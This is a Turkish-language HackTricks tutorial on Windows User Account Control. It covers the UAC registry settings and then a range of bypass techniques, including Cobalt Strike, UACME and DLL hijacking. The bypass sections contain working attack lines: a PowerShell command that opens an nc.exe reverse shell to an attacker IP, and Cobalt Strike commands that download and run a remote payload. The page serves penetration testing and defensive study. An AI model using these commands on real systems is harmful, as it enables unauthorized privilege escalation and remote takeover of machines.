# UAC - Kullanıcı Hesabı Kontrolü

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com)'ni edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın.**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Kullanıcı Hesabı Kontrolü (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), yükseltilmiş faaliyetler için bir **izin istemi** sağlayan bir özelliktir. Uygulamalar farklı `bütünlük` seviyelerine sahiptir ve yüksek seviyede bir program, sistemi **tehlikeye atabilecek görevleri gerçekleştirebilir**. UAC etkinleştirildiğinde, uygulamalar ve görevler her zaman bir yönetici hesabının güvenlik bağlamı altında çalışır, yönetici bu uygulamaların/görevlerin sisteme yönetici düzeyinde erişim sağlaması için açıkça izin vermediği sürece. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.

Daha fazla bütünlük seviyeleri hakkında bilgi için:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UAC devredeyken, bir yönetici kullanıcıya 2 belirteç verilir: düzenli düzeydeki işlemleri gerçekleştirmek için standart kullanıcı anahtarı ve yönetici ayrıcalıkları olan bir belirteç.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin çalışma şekli, oturum açma işlemi, kullanıcı deneyimi ve UAC mimarisini detaylı olarak ele almaktadır. Yöneticiler, yerel düzeyde (secpol.msc kullanarak) UAC'nin nasıl çalışacağını kurumlarına özgü olarak yapılandırmak için güvenlik politikalarını kullanabilir veya yapılandırabilir ve Active Directory etki alanı ortamında Grup İlkesi Nesneleri (GPO) aracılığıyla yapılandırabilir ve dağıtabilir. Çeşitli ayarlar detaylı olarak [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) tartışılmaktadır. UAC için ayarlanabilecek 10 Grup İlkesi ayarı bulunmaktadır. Aşağıdaki tablo ek detaylar sağlar:

| Grup İlkesi Ayarı                                                                                                                                                                                                                                                                                                                                                           | Kayıt Anahtarı                | Varsayılan Ayar                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Yerleşik Yönetici hesabı için Yönetici Onay Modu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Devre Dışı                                                     |
| [UIAccess uygulamalarının güvenli masaüstü kullanmadan yükseltme isteğine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Devre Dışı                                                     |
| [Yönetici Onay Modunda Yöneticiler için yükseltme isteği davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows dışı ikili dosyalar için onay iste                  |
| [Standart kullanıcılar için yükseltme isteği davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Güvenli masaüstünde kimlik doğrulama isteği                 |
| [Uygulama yüklemelerini algıla ve yükseltme isteği için uyar](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Etkin (ev için varsayılan) Devre Dışı (kurumsal için varsayılan) |
| [Yalnızca imzalı ve doğrulanmış yürütülebilir dosyaları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Devre Dışı                                                     |
| [Güvenli konumlarda yüklü olan UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Etkin                                                      |
| [Tüm yöneticileri Yönetici Onay Modunda çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Etkin                                                      |
| [Yükseltme isteği yaparken güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Etkin                                                      |
| [Dosya ve kayıt defteri yazma hatalarını kullanıcı başına konumlara sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Etkin                                                      |
### UAC Atlatma Teorisi

Bazı programlar, **kullanıcı yönetici grubuna aitse** otomatik olarak **yükseltilir**. Bu ikili dosyaların içinde _**Manifestolar**_ bulunur ve _**autoElevate**_ seçeneği _**True**_ değerine sahiptir. Ayrıca ikili dosyanın **Microsoft tarafından imzalanmış** olması gerekir.

Ardından, **UAC'yi atlamak** için (orta bütünlük seviyesinden yüksek seviyeye yükseltmek için) bazı saldırganlar bu tür ikili dosyaları kullanarak **keyfi kodları yürütürler** çünkü bu kodlar **yüksek bütünlük seviyesinden işlenir**.

Bir ikili dosyanın _**Manifestosunu**_ kontrol etmek için Sysinternals'ten _**sigcheck.exe**_ aracını kullanabilirsiniz. Ve işlemlerin **bütünlük seviyesini** görmek için _Process Explorer_ veya _Process Monitor_ (Sysinternals'ten) kullanabilirsiniz.

### UAC'yi Kontrol Et

UAC'nin etkin olup olmadığını doğrulamak için şunu yapın:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Eğer **`1`** ise, UAC **etkinleştirilmiştir**, eğer **`0`** veya **mevcut değilse**, o zaman UAC **etkisizdir**.

Sonra, yapılandırılmış **hangi seviye**'nin kontrol edilmesi:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Eğer **`0`** ise, UAC soru sormaz (engellenmiş gibi)
* Eğer **`1`** ise yönetici, yüksek haklarla bir uygulamayı yürütmek için kullanıcı adı ve şifre istenir (Güvenli Masaüstü üzerinde)
* Eğer **`2`** (**Her zaman beni bilgilendir**) UAC, yönetici bir şeyi yüksek ayrıcalıklarla yürütmeye çalıştığında her zaman onayını isteyecektir (Güvenli Masaüstü üzerinde)
* Eğer **`3`** ise `1` gibi ancak Güvenli Masaüstü üzerinde gerekli değil
* Eğer **`4`** ise `2` gibi ancak Güvenli Masaüstü üzerinde gerekli değil
* Eğer **`5`** (**varsayılan**) yöneticiye, yüksek ayrıcalıklarla Windows dışı uygulamaları çalıştırmak için onayını sormak isteyecektir

Ardından, **`LocalAccountTokenFilterPolicy`** değerine bakmanız gerekmektedir.\
Eğer değer **`0`** ise, sadece **RID 500** kullanıcısı (**yerleşik Yönetici**) UAC olmadan **yönetici görevlerini gerçekleştirebilir**, ve eğer `1` ise, **"Yöneticiler"** grubundaki tüm hesaplar bunları yapabilir.

Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakın.\
Eğer **`0`**(varsayılan), **yerleşik Yönetici hesabı** uzaktan yönetim görevlerini yapabilir ve eğer **`1`** ise yerleşik Yönetici hesabı **uzaktan yönetim görevlerini yapamaz**, `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmamışsa.

#### Özet

* Eğer `EnableLUA=0` veya **mevcut değilse**, **hiç kimse için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1` , Hiç kimse için UAC yok**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0`, RID 500 için UAC yok (Yerleşik Yönetici)**
* Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=1`, Herkes için UAC var**

Tüm bu bilgiler **metasploit** modülü kullanılarak toplanabilir: `post/windows/gather/win_privs`

Ayrıca kullanıcı gruplarınızı kontrol edebilir ve bütünlük seviyesini alabilirsiniz:
```
net user %username%
whoami /groups | findstr Level
```
## UAC atlaması

{% hint style="info" %}
Not: Eğer kurbanın grafik erişimi varsa, UAC atlaması oldukça basittir çünkü UAC uyarısı çıktığında sadece "Evet"e tıklamanız yeterlidir.
{% endhint %}

UAC atlaması aşağıdaki durumda gereklidir: **UAC etkinleştirilmişse, işleminiz orta bütünlük bağlamında çalışıyorsa ve kullanıcı yöneticiler grubuna aitse**.

Belirtmek önemlidir ki, **UAC'nin en yüksek güvenlik seviyesinde (Her Zaman) olduğunda atlamak çok daha zordur, diğer seviyelerde (Varsayılan) olduğunda ise daha kolaydır.**

### UAC devre dışı

Eğer UAC zaten devre dışı bırakılmışsa (`ConsentPromptBehaviorAdmin` **`0`**) şunun gibi bir şey kullanarak **yönetici ayrıcalıklarıyla ters kabuk çalıştırabilirsiniz** (yüksek bütünlük seviyesi):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC token çoğaltma ile atlanması

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "atlatma" (tam dosya sistemi erişimi)

Eğer Yöneticiler grubunda olan bir kullanıcıya sahip bir kabukunuz varsa, C$ paylaşımını SMB (dosya sistemi) üzerinden **bağlayabilirsiniz**, yeni bir diskte yerel olarak ve dosya sistemi içindeki **her şeye erişebilirsiniz** (hatta Yönetici ana klasörüne bile).

{% hint style="warning" %}
**Bu hile artık işe yaramıyor gibi görünüyor**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike ile UAC atlatma

Cobalt Strike teknikleri, UAC maksimum güvenlik seviyesine ayarlanmamışsa çalışacaktır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **atlatmak** için birkaç modüle sahiptir.

### KRBUACBypass

Belgeler ve araç [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC atlatma saldırıları

[**UACME**](https://github.com/hfiref0x/UACME) birkaç UAC atlatma saldırısının bir **derlemesi**. UACME'yi **visual studio veya msbuild kullanarak derlemeniz gerekecektir**. Derleme, birkaç yürütülebilir dosya oluşturacaktır (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`), **hangisine ihtiyacınız olduğunu bilmelisiniz.**\
Bazı atlatmaların **kullanıcıya bir şeylerin olduğunu bildiren diğer programları tetikleyebileceğini** unutmayın, bu yüzden **dikkatli olmalısınız**.

UACME'nin her tekniğin çalışmaya başladığı **derleme sürümüne sahip olduğunu**. Sürümünüzü etkileyen bir tekniği arayabilirsiniz:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### UAC Kullanıcı Hesabı Kontrolü

Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) sayfayı kullanarak Windows sürümü `1607`'yi derleme sürümlerinden alabilirsiniz.

#### Daha Fazla UAC Atlatma

Burada kullanılan **tüm** teknikler, UAC'yi atlamak için **kurbanla tam etkileşimli bir kabuk gerektirir** (genel bir nc.exe kabuğu yeterli değildir).

Bir **meterpreter** oturumu alabilirsiniz. **Session** değeri **1** olan bir **işlem**e geçiş yapın:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ çalışmalıdır)

### GUI ile UAC Atlatma

Eğer bir **GUI'ye erişiminiz varsa, UAC isteğini** aldığınızda sadece kabul edebilirsiniz, gerçekten bir atlatıcıya ihtiyacınız yok. Bu nedenle, bir GUI'ye erişim sağlamak, UAC'yi atlatmanıza izin verecektir.

Ayrıca, birisi tarafından kullanılan bir GUI oturumu elde ederseniz (potansiyel olarak RDP aracılığıyla) **yönetici olarak çalışacak bazı araçlar** bulunmaktadır, buradan doğrudan **yönetici olarak** örneğin **cmd** çalıştırabilirsiniz ve UAC tarafından tekrar uyarılmadan [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi. Bu biraz daha **gizli** olabilir.

### Gürültülü kaba kuvvet UAC Atlatma

Gürültü yapmaktan endişe etmiyorsanız, her zaman [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şey çalıştırabilir ve kullanıcı izinlerini yükseltmesini **kabul edene kadar talep edebilirsiniz**.

### Kendi Atlatıcınız - Temel UAC Atlatma Metodolojisi

**UACME**'ye bir göz atarsanız, **çoğu UAC atlatıcısının Dll Hijacking zafiyetini** (genellikle kötü niyetli dll'yi _C:\Windows\System32_'ye yazma) istismar ettiğini göreceksiniz. [Bir Dll Hijacking zafiyeti bulmayı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking.md).

1. **Otomatik yükselme** yapacak bir ikili bulun (çalıştırıldığında yüksek bütünlük seviyesinde çalıştığını kontrol edin).
2. **Procmon** ile **"NAME NOT FOUND"** olaylarını bulun ve **DLL Hijacking** için savunmasız olabilecek olayları belirleyin.
3. Muhtemelen, kötü niyetli DLL'yi bazı **korunan yollara** (örneğin C:\Windows\System32 gibi) yazmanız gerekecektir. Bu, şunları kullanarak atlatılabilir:
   1. **wusa.exe**: Windows 7, 8 ve 8.1. Bu araç, yüksek bütünlük seviyesinden çalıştırıldığı için korunan yollara bir CAB dosyasının içeriğini çıkarmayı sağlar.
   2. **IFileOperation**: Windows 10.
4. DLL'nizi korunan yola kopyalamak ve savunmasız ve otomatik yükseltilmiş ikiliyi çalıştırmak için bir **betik** hazırlayın.

### Başka Bir UAC Atlatma Tekniği

**Otomatik yükseltilmiş bir ikili**nin, **kayıttan** bir **ikili** veya **komutun adını/yolunu** okumaya çalışıp çalışmadığını izlemek (bu, ikilinin bu bilgiyi **HKCU** içinde araması daha ilginçtir).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
